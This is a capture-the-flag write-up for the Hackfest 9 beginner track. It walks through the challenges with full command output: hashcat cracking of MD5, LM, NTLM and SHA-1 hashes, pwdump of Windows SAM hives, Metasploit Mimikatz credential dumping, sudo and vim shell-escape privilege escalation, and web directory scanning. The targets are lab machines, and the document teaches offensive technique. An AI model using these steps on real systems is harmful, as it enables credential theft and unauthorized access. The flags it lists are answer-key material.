# Hackfest 9 Beginner Track

## Exploitation

### Ping Scan

### Nmap

### Python
This challenge requires the completion of [SSH challenge](#ssh)
>On the box there is a python script you can exploit, you can read the Nyan flag?

>Address: Same machine as as the ping scan
Note: use the ssh key from the first Linux challenge to log into the box.

Running ```sudo -l``` indicates that Nyan can run the following program with no pw. Modify the script so it displays the flag using ```os.system("cat /home/Nyan/flag.txt")```.
```
Grumpy@BegginerBox:~$ sudo -u Nyan /usr/bin/python2.7 /home/Nyan/script.py
HF-21ED0355867EE411144B4CA045DCA640
Access granted.
```
## Cipher
### B64

> Here is the string : SEYtNmQzZTdmMTlhNjhlM2FjOWY4ZGM2ODNhYTJlNjFlZDY=

```
root@kingpin:~# echo "SEYtNmQzZTdmMTlhNjhlM2FjOWY4ZGM2ODNhYTJlNjFlZDY=" | base64 --decode
HF-6d3e7f19a68e3ac9f8dc683aa2e61ed6
````

### Julius

>One of the first used cipher in history.
>Challenge:
XV-vvrru3u1627s71rvru5suut8sus9s6q9

Decode Caesar cipher

HF-ffbbe3e1627c71bfbe5ceed8cec9c6a9

### Hash 1

>Here is a md5 hash, crack it and paste the password for the key:
9d4e215dbfaac494b4ef6afcc6af4520

Running it through md5 dict returns ```//hacker//```

### Hash-2

> LM Hashes was used by microsoft for storing password which is now replaced by NTLM.
0182BD0BD4444BF83535BADF93F05C79

```
MacBook-Pro-Leo:~ Scream$ hashcat -a 0 -m 3000 hash.txt ~/hashcat/rockyou.txt --force
hashcat (v3.20-18-g2039e2c) starting...

OpenCL Platform #1: Apple
=========================
* Device #1: Intel(R) Core(TM) i5-4288U CPU @ 2.60GHz, skipped
* Device #2: Iris, 384/1536 MB allocatable, 40MCU

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable Optimizers:
* Zero-Byte
* Precompute-Final-Permutation
* Not-Iterated
* Single-Salt

Watchdog: Temperature abort trigger disabled
Watchdog: Temperature retain trigger disabled

Cache-hit dictionary stats /Users/Scream/hashcat/rockyou.txt: 139921497 bytes, 14343296 words, 14343296 keyspace

0182bd0bd4444bf8:1234567                                  
3535badf93f05c79:891011                                   

Session..........: hashcat
Status...........: Cracked
Hash.Type........: LM
Hash.Target......: 0182bd0bd4444bf8, 3535badf93f05c79
Time.Started.....: Fri Nov  3 18:54:17 2017 (0 secs)
Time.Estimated...: Fri Nov  3 18:54:17 2017 (0 secs)
Input.Base.......: File (/Users/Scream/hashcat/rockyou.txt)
Input.Queue......: 1/1 (100.00%)
Speed.Dev.#2.....:  1718.4 kH/s (0.34ms)
Recovered........: 2/2 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 20480/14343296 (0.14%)
Rejected.........: 0/20480 (0.00%)
Restore.Point....: 17920/14343296 (0.12%)
Candidates.#2....: AD -> L

Started: Fri Nov  3 18:54:07 2017
Stopped: Fri Nov  3 18:54:18 2017
```

### Hash-3

>NTLM Hash
AAD3B435B51404EEAAD3B435B51404EE:D0D6D1C6E9DAC9A542C505F11166EB31:::

```
MacBook-Pro-Leo:~ Scream$ printf "AAD3B435B51404EEAAD3B435B51404EE\nD0D6D1C6E9DAC9A542C505F11166EB31" > hash.txt
MacBook-Pro-Leo:~ Scream$ hashcat -a 0 -m 1000 hash.txt ~/hashcat/rockyou.txt --force
hashcat (v3.20-18-g2039e2c) starting...

OpenCL Platform #1: Apple
=========================
* Device #1: Intel(R) Core(TM) i5-4288U CPU @ 2.60GHz, skipped
* Device #2: Iris, 384/1536 MB allocatable, 40MCU

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable Optimizers:
* Zero-Byte
* Precompute-Init
* Precompute-Merkle-Demgard
* Meet-In-The-Middle
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

Watchdog: Temperature abort trigger disabled
Watchdog: Temperature retain trigger disabled

Cache-hit dictionary stats /Users/Scream/hashcat/rockyou.txt: 139921497 bytes, 14343296 words, 14343296 keyspace

INFO: approaching final keyspace, workload adjusted       

d0d6d1c6e9dac9a542c505f11166eb31:!#udamnHACKER#!          

Session..........: hashcat
Status...........: Exhausted
Hash.Type........: NTLM
Hash.Target......: hash.txt
Time.Started.....: Fri Nov  3 19:02:04 2017 (1 sec)
Time.Estimated...: Fri Nov  3 19:02:05 2017 (0 secs)
Input.Base.......: File (/Users/Scream/hashcat/rockyou.txt)
Input.Queue......: 1/1 (100.00%)
Speed.Dev.#2.....: 12310.4 kH/s (9.80ms)
Recovered........: 1/2 (50.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 14343296/14343296 (100.00%)
Rejected.........: 5450/14343296 (0.04%)
Restore.Point....: 14343296/14343296 (100.00%)
Candidates.#2....: $HEX[31392e30332e3838] -> $HEX[042a0337c2a156616d6f732103]

Started: Fri Nov  3 19:01:54 2017
Stopped: Fri Nov  3 19:02:06 2017
```

### Hash-4

> This time is a SHA-1 Hash.
However this time you have some hints about the password, it consist of 6 lowercase character.
Hash: fa02aec35180790522f0062e316f462611ed22e4

Generate a policy for the hash.
```
MacBook-Pro-Leo:PACK-0.0.4 Scream$ python policygen.py --minlength 6 --maxlength 6 --minlower 6 -o hash.mask
                       _
     PolicyGen 0.0.2  | |
      _ __   __ _  ___| | _
     | '_ \ / _` |/ __| |/ /
     | |_) | (_| | (__|   <
     | .__/ \__,_|\___|_|\_\
     | |                    
     |_| iphelix@thesprawl.org


[*] Saving generated masks to [hash.mask]
[*] Using 1,000,000,000 keys/sec for calculations.
[*] Password policy:
    Pass Lengths: min:6 max:6
    Min strength: l:6 u:None d:None s:None
    Max strength: l:None u:None d:None s:None
[*] Generating [compliant] masks.
[*] Generating 6 character password masks.
[*] Total Masks:  4096 Time: 0:12:15
[*] Policy Masks: 1 Time: 0:00:00
MacBook-Pro-Leo:PACK-0.0.4 Scream$ echo
```
Place the hash in a file.
```
 "fa02aec35180790522f0062e316f462611ed22e4" > hash.txt
```

```
MacBook-Pro-Leo:PACK-0.0.4 Scream$ hashcat -a 3 -m 100 hash.txt hash.mask
hashcat (v3.20-18-g2039e2c) starting...

OpenCL Platform #1: Apple
=========================
* Device #1: Intel(R) Core(TM) i5-4288U CPU @ 2.60GHz, skipped
* Device #2: Iris, 384/1536 MB allocatable, 40MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Applicable Optimizers:
* Zero-Byte
* Precompute-Init
* Precompute-Merkle-Demgard
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

Watchdog: Temperature abort trigger disabled
Watchdog: Temperature retain trigger disabled

The wordlist or mask you are using is too small.
Therefore, hashcat is unable to utilize the full parallelization power of your device(s).
The cracking speed will drop.
Workaround: https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#how_to_create_more_work_for_full_speed

INFO: approaching final keyspace, workload adjusted       

fa02aec35180790522f0062e316f462611ed22e4:kwutff           

Session..........: hashcat
Status...........: Cracked
Hash.Type........: SHA1
Hash.Target......: fa02aec35180790522f0062e316f462611ed22e4
Time.Started.....: Fri Nov  3 19:12:00 2017 (2 secs)
Time.Estimated...: Fri Nov  3 19:12:02 2017 (0 secs)
Input.Mask.......: ?l?l?l?l?l?l [6]
Input.Queue......: 1/1 (100.00%)
Speed.Dev.#2.....: 84118.6 kH/s (4.36ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 172279952/308915776 (55.77%)
Rejected.........: 0/172279952 (0.00%)
Restore.Point....: 0/456976 (0.00%)
Candidates.#2....: kwnder -> kwqfqg

Started: Fri Nov  3 19:11:57 2017
Stopped: Fri Nov  3 19:12:03 2017
```
## Windows
### hashdump

> A hacker has given you the SAM and SYSTEM hive from a windows machine, can you recover the hashes and therefore the passwords?

```
root@kingpin:~# pwdump Downloads/SYSTEM Downloads/SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b963c57010f218edc2cc3c229b5e4d0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

```
MacBook-Pro-Leo:PACK-0.0.4 Scream$ hashcat -a 0 -m 1000 hashes.txt ~/hashcat/rockyou.txt --force
hashcat (v3.20-18-g2039e2c) starting...

OpenCL Platform #1: Apple
=========================
* Device #1: Intel(R) Core(TM) i5-4288U CPU @ 2.60GHz, skipped
* Device #2: Iris, 384/1536 MB allocatable, 40MCU

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable Optimizers:
* Zero-Byte
* Precompute-Init
* Precompute-Merkle-Demgard
* Meet-In-The-Middle
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

Watchdog: Temperature abort trigger disabled
Watchdog: Temperature retain trigger disabled

31d6cfe0d16ae931b73c59d7e0c089c0:                         
INFO: Removed 1 hash found in potfile

Cache-hit dictionary stats /Users/Scream/hashcat/rockyou.txt: 139921497 bytes, 14343296 words, 14343296 keyspace

b963c57010f218edc2cc3c229b5e4d0f:iloveyou                 

Session..........: hashcat
Status...........: Cracked
Hash.Type........: NTLM
Hash.Target......: hashes.txt
Time.Started.....: Fri Nov  3 20:56:30 2017 (1 sec)
Time.Estimated...: Fri Nov  3 20:56:31 2017 (0 secs)
Input.Base.......: File (/Users/Scream/hashcat/rockyou.txt)
Input.Queue......: 1/1 (100.00%)
Speed.Dev.#2.....: 84737.5 kH/s (9.39ms)
Recovered........: 2/2 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 1310794/14343296 (9.14%)
Rejected.........: 74/1310794 (0.01%)
Restore.Point....: 0/14343296 (0.00%)
Candidates.#2....: 123456 -> saylor010801

Started: Fri Nov  3 20:56:27 2017
Stopped: Fri Nov  3 20:56:32 2017
```
### PTH


### Mimikatz


>Now that you have access to 172.28.5.25 i need you to give me his password.
There is a powerfull tool called Mimikatz that does what you need.

>From now on Windows 10 and Windows Server 2016 are patched against this by default, however this is not the case on other version of windows.

```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(psexec) > search mimikatz

Matching Modules
================

   Name                                                 Disclosure Date  Rank    Description
   ----                                                 ---------------  ----    -----------
   auxiliary/admin/kerberos/ms14_068_kerberos_checksum  2014-11-18       normal  MS14-068 Microsoft Kerberos Checksum Validation Vulnerability
   post/windows/escalate/golden_ticket                                   normal  Windows Escalate Golden Ticket
   post/windows/escalate/golden_ticket                                   normal  Windows Escalate Golden Ticket
   post/windows/gather/credentials/sso                                   normal  Windows Single Sign On Credential Collector (Mimikatz)
   post/windows/manage/wdigest_caching                                   normal  Windows Post Manage WDigest Credential Caching


msf exploit(psexec) > use post/windows/gather/credentials/sso
msf post(sso) > show options

Module options (post/windows/gather/credentials/sso):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf post(sso) > set session 1
session => 1
msf post(sso) > run

[*] Running module against PTH-PC
[-] x64 platform requires x64 meterpreter and mimikatz extension
[*] Post module execution completed
msf post(sso) > sessions -i 1
[*] Starting interaction with 1...
```
Migrate the session to 64 bit process and repeat.
```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System             x64   0                                      
 260   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 ...
 1260  1180  explorer.exe       x64   1        PTH-PC\PTH                    C:\Windows\explorer.exe
 ...

meterpreter > migrate 1260
[*] Migrating from 2128 to 1260...
[*] Migration completed successfully.
meterpreter > background
[*] Backgrounding session 1...
msf post(sso) > run

[*] Running module against PTH-PC
Windows SSO Credentials
=======================

AuthID   Package  Domain  User  Password
------   -------  ------  ----  --------
0;53896  NTLM     PTH-PC  PTH   WindowsIsBrokenByDefault
0;53896  NTLM     PTH-PC  PTH   

[*] Post module execution completed
```
## Linux

### <a name="ssh"></a>SSH

> You are given an SSH key to the kingdom, do you know how to use it?
>Address: The ip you found on the ping scan

Change permissions of the key to 600 and connect.
```
root@kingpin:~# ssh -i Downloads/SSH-KEY Grumpy@172.28.5.10
Welcome to Ubuntu 16.04.3 LTS (Ubuntu L33t Box)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Box!
Last login: Sat Nov  4 02:26:46 2017 from 172.28.1.73
Grumpy@BegginerBox:~$ ls
flag.txt
Grumpy@BegginerBox:~$ cat flag.txt
HF-336B63E842390B1A44CB4EEB28F9D19E
```



### Version


>Read the kernel version on the server you just have accessed.

> This is one of the things a to check for because kernel version could give us an idea of how old a system is and if there is known vulnerabilities on it.

```
Grumpy@BegginerBox:~$ uname -r
Linux BegginerBox 4.10.17-3-pve #1 SMP PVE 4.10.17-23 (Tue, 19 Sep 2017 09:43:50 +0200) x86_64 x86_64 x86_64 GNU/Linux HF-6aaf3f8675f099850a568f59819b68df Grumpy@BegginerBox:~$
```




### Hidden File


> Get a shell as the user Grumpy and look for a hidden file.

```
mpy@BegginerBox:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .hidden  .nano  .profile  .ssh  .viminfo  flag.txt
Grumpy@BegginerBox:~$ cat .hidden/.flag.txt
HF-B6E256031D277B3937612C261A9C4E8B
```

### Sudo

>The user Grumpy has some sudo privilege, learn to use sudo to be able to read the flag as the user "Kitty"


```
Grumpy@BegginerBox:~$ sudo -u Kitty cat /home/Kitty/flag.txt
```

### Vim
List user privileges for command execution with ```sudo -l```
```
User Grumpy may run the following commands on BegginerBox.infra.hf:
    (Kitty) NOPASSWD: ALL
    (Nyan) NOPASSWD: /usr/bin/python2.7 /home/Nyan/script.py
    (Kitkat) NOPASSWD: /usr/bin/vim /etc/shadow
```
Run vim as Kitkat.
```
Grumpy@BegginerBox:~$ sudo -u Kitkat /etc/alternatives/vim /etc/shadow
```
Spawn a shell in vim
```
:! sh

$ whoami
Kitkat
$ cat /home/Kitkat/flag.txt
HF-66CA132BA04D3054D65207F3142AC145
```
## Web

### Web Scan

>I want you to enumerate the content of the web server, for that you will need a web scanner. Play with them as not all tools are the same, here a few that i use on a regular basis.

>Address: Same machine as as the ping scan

```
root@kingpin:~# dirb http://172.28.5.10 /usr/share/dirb/wordlists/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Nov  3 19:26:52 2017
URL_BASE: http://172.28.5.10/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://172.28.5.10/ ----
==> DIRECTORY: http://172.28.5.10/backup/                                                              
==> DIRECTORY: http://172.28.5.10/flag/                                                                
+ http://172.28.5.10/index.html (CODE:200|SIZE:36)                                                     
+ http://172.28.5.10/robots.txt (CODE:200|SIZE:59)                                                     
+ http://172.28.5.10/server-status (CODE:403|SIZE:299)                                                 
==> DIRECTORY: http://172.28.5.10/test/                                                                

---- Entering directory: http://172.28.5.10/backup/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://172.28.5.10/flag/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://172.28.5.10/test/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Fri Nov  3 19:27:03 2017
DOWNLOADED: 4612 - FOUND: 3
```

Navigate to http://172.28.5.10/flag/HF/HF.txt

HF-952ccca0e8728353becce2f6aaf09063


### Crawler

What page does a crawler check to see where he can and cannot go?

Address: Same machine as as the ping scan

The answer is a full flag not just the file name.

- Add the url to Burp's spider
- Discover the url below.

http://172.28.5.10/27F5E15B6AF3223F1176293CD015771D/flag.txt

HF-27F5E15B6AF3223F1176293CD015771D
